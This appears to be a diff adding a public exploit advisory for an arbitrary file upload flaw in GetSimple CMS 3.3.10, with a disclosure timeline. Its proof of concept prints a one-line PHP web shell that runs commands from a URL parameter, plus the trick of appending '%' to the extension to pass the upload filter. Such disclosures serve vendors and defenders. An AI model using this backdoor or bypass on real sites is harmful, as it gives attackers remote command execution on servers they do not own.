@@ -1,0 +1,45 @@
+# Exploit Title: Getsimple CMS <= 3.3.10 Arbitrary File Upload Vulnerability
+# Google Dork: -
+# Date: 23/06/2016
+# Exploit Author: s0nk3y
+# Vendor Homepage: http://get-simple.info/
+# Category: webapps
+# Software Link: http://get-simple.info/data/uploads/releases/GetSimpleCMS-3.3.10.zip
+# Version: 3.3.10
+# Tested on: Ubuntu 16.04 / Mozilla Firefox
+# Twitter: http://twitter.com/s0nk3y
+# Linkedin: Rahmat Nurfauzi - http://linkedin.com/in/rahmatnurfauzi
+
+Description
+========================
+
+GetSimple CMS has been downloaded over 120,000 times (as of March 2013). 
+The magazine t3n assigns GetSimple as "micro" and "Minimal-CMS" one, praises 
+the simplicity yet possible extensibility through plug-ins.
+
+Vulnerability
+========================
+
+GetSimpleCMS Version 3.3.10 suffers from arbitrary file upload vulnerability 
+which allows an attacker to upload a backdoor.
+
+This vulnerability is that the application uses a blacklist and whitelist 
+technique to compare the file against mime types and extensions.
+
+Proof of Concept
+========================
+
+For exploiting this vulnerability we will create a file by adding the percent 
+behind extension.
+1. evil.php% <--- this is simple trick :)
+<?php
+// simple backdoor
+system($_GET['cmd']);
+?>
+2. An attacker login to the admin page and uploading the backdoor
+3. The uploaded file will be under the "/data/uploads/" folder
+
+Report Timeline
+========================
+2016-06-23 : Vulnerability reported to vendor
+2016-06-23 : Disclosure
